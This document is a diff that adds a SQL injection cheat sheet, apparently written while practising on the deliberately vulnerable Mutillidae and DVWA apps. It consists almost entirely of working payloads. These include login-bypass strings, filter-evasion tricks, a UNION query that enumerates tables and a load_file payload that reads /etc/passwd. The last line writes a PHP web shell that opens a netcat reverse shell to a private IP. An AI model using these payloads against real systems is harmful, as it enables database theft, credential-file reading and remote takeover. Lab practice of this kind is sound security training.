@@ -1,0 +1,52 @@
+Examples of TRUE statements for discovering sqli
+aNd 1=1
+aNd 21=21
+orDeR bY 1
+
+Examples of FALSE statements
+dNd 0=1
+anD 9=2
+ordEr bY 1000000000000
+
+Characters to use instead of spaces:
++, /**/, %20
+Examples: orDeR bY 1 can be re-written as
+orDer+bY+1
+orDer/**/bY/**/1
+orDer%20bY%201
+
+Comments to end the quries:
+/*
+//
+#
+%23
+
+Ps: sometimes you might need to add ';' before the comment, examples:
+anD 1=1//
+anD 1=1;//
+
+aaa' or 1=1 #
+adminpass
+123456' and 1=1#'
+admin' #
+
+aa' or 1=1#
+
+#########################################################
+union select table_name,2 from information_schema.tables
+
+#########################################################
+page=user-info php&username=admin'union select null,load_file('/etc/passwd'),null,null,null%23&password=adminpass&user-info-php-sub
+
+################################################################
+
+http://192.168.197.50/mutillidae/index.php?page=user-info.php&username=admin&password=adminpass&user-info-php-submit-button=View+Account+Details
+
+
+
+http://192.168.197.50/mutillidae/index.php?page=user-info.php&username=admin&password=aaaaaa&user-info-php-submit-button=View+Account+Details
+
+
+1' and 1=1
+############################################################
+union select '<?passthru("nc -e /bin/sh 192.168.197.35 8080");?>',null into outfile '/var/www/dvwa/reverse.php'
